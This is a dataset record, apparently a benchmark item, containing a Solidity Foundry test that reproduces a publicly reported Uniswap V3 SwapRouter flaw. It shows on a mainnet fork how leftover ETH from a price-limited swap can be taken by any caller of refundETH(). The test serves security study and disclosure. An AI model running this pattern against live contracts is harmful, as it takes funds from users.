    "file_content": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n// this excersise is specific UniSwapV3 ETH refund issue\n// https://github.com/Jeiwan/uniswapv3-unrefunded-eth-poc\n// @article:\n// https://jeiwan.net/posts/public-bug-report-uniswap-swaprouter/\n\nstruct ExactInputSingleParams {\n    address tokenIn;\n    address tokenOut;\n    uint24 fee;\n    address recipient;\n    uint256 deadline;\n    uint256 amountIn;\n    uint256 amountOutMinimum;\n    uint160 sqrtPriceLimitX96;\n}\n\ninterface ISwapRouter {\n    function exactInputSingle(\n        ExactInputSingleParams calldata params\n    ) external payable returns (uint256 amountOut);\n\n    function refundETH() external payable;\n}\n\ninterface IPool {\n    function slot0()\n        external\n        view\n        returns (\n            uint160 sqrtPriceX96,\n            int24 tick,\n            uint16 observationIndex,\n            uint16 observationCardinality,\n            uint16 observationCardinalityNext,\n            uint8 feeProtocol,\n            bool unlocked\n        );\n}\n\ninterface IERC20 {\n    function balanceOf(address) external view returns (uint256);\n}\n\ninterface IWETH9 {\n    function approve(address guy, uint256 wad) external returns (bool);\n}\n\ncontract UniswapV3ETHRefundExploitTest is Test {\n    ISwapRouter router =\n        ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);\n    IPool pool = IPool(0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640);\n\n    address weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\n    address usdc = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;\n\n    function testExploit() public {\n        vm.createSelectFork(\"mainnet\", 16454867);\n\n        uint256 amountIn = 100 ether;\n\n        vm.label(address(this), \"user\");\n        vm.deal(address(this), amountIn);\n\n        // Users sells 100 ETH to buy USDC. They have a limit price set.\n        ExactInputSingleParams memory params = ExactInputSingleParams({\n            tokenIn: weth,\n            tokenOut: usdc,\n            fee: 500,\n            recipient: address(this),\n            deadline: block.timestamp,\n            amountIn: amountIn,\n            amountOutMinimum: 0,\n            sqrtPriceLimitX96: 1956260967287247098961477920037032 // (sqrtPrice before + sqrtPrice after) / 2\n        });\n\n        // Full input amount is sent along the call.\n        router.exactInputSingle{value: amountIn}(params);\n\n        // User has bought some USDC. However, the full input ETH amount wasn't used...\n        assertEq(IERC20(usdc).balanceOf(address(this)), 81979.308775e6);\n\n        // ... the remaining ETH is still in the Router contract.\n        uint256 routerBeforeBalance = address(router).balance;\n        assertEq(routerBeforeBalance, 50 ether);\n\n        // A MEV bot steals the remaining ETH by calling the public refundETH function.\n        address mev = address(0x31337);\n        vm.label(mev, \"mev\");\n\n        vm.prank(mev);\n        router.refundETH();\n        assertEq(address(mev).balance, 50 ether);\n        uint256 routerAfterBalance = address(router).balance;\n        assertEq(routerAfterBalance, 0 ether);\n        console.log(\n            \"router loss ether amount:\",\n            routerBeforeBalance - routerAfterBalance\n        );\n    }\n}\n",
    "pragma": "",
    "difficulty_tier": 3,
    "context_level": "intra_contract"
  }
]